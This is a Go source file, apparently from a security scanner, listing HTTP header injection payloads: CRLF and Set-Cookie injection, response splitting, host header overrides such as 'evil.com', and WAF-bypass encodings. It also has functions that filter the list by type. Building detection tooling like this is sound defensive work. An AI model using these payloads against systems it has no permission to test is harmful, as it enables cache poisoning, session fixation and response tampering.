// Package headerinj provides payloads for HTTP Header Injection detection.
package headerinj

// InjectionType represents the type of header injection.
type InjectionType string

const (
	TypeNewline       InjectionType = "newline"
	TypeHostHeader    InjectionType = "host_header"
	TypeResponseSplit InjectionType = "response_split"
)

// Payload represents a header injection payload.
type Payload struct {
	Value       string
	Type        InjectionType
	Description string
	WAFBypass   bool
	Marker      string // Expected injected header name
}

var payloads = []Payload{
	// CRLF-based header injection (inject new headers)
	{Value: "test\r\nX-Injected: true", Type: TypeNewline, Description: "CRLF header injection", Marker: "X-Injected"},
	{Value: "test%0d%0aX-Injected:%20true", Type: TypeNewline, Description: "URL encoded CRLF", Marker: "X-Injected"},
	{Value: "test%0aX-Injected:%20true", Type: TypeNewline, Description: "LF only injection", Marker: "X-Injected"},
	{Value: "test%0dX-Injected:%20true", Type: TypeNewline, Description: "CR only injection", Marker: "X-Injected"},
	{Value: "test\r\nSet-Cookie: injected=true", Type: TypeNewline, Description: "Cookie injection via CRLF", Marker: "Set-Cookie"},
	{Value: "test%0d%0aSet-Cookie:%20injected=true", Type: TypeNewline, Description: "URL encoded cookie injection", Marker: "Set-Cookie"},

	// Response splitting
	{Value: "test\r\n\r\n<html>injected</html>", Type: TypeResponseSplit, Description: "HTTP response splitting", Marker: ""},
	{Value: "test%0d%0a%0d%0a<html>injected</html>", Type: TypeResponseSplit, Description: "URL encoded response splitting", Marker: ""},

	// Host header injection
	{Value: "evil.com", Type: TypeHostHeader, Description: "Host header override"},
	{Value: "localhost:8080", Type: TypeHostHeader, Description: "Localhost host override"},
	{Value: "target.com\r\nX-Injected: true", Type: TypeHostHeader, Description: "Host header with CRLF", Marker: "X-Injected"},

	// WAF bypass
	{Value: "test%E5%98%8A%E5%98%8DX-Injected:%20true", Type: TypeNewline, Description: "Unicode CRLF bypass (UTF-8)", WAFBypass: true, Marker: "X-Injected"},
	{Value: "test\u560d\u560aX-Injected: true", Type: TypeNewline, Description: "Unicode newline chars", WAFBypass: true, Marker: "X-Injected"},
	{Value: "test%c0%8d%c0%8aX-Injected: true", Type: TypeNewline, Description: "Overlong UTF-8 encoding", WAFBypass: true, Marker: "X-Injected"},
}

// GetPayloads returns all header injection payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetWAFBypassPayloads returns only WAF bypass payloads.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range payloads {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetByType returns payloads for a specific injection type.
func GetByType(injType InjectionType) []Payload {
	var result []Payload
	for _, p := range payloads {
		if p.Type == injType {
			result = append(result, p)
		}
	}
	return result
}
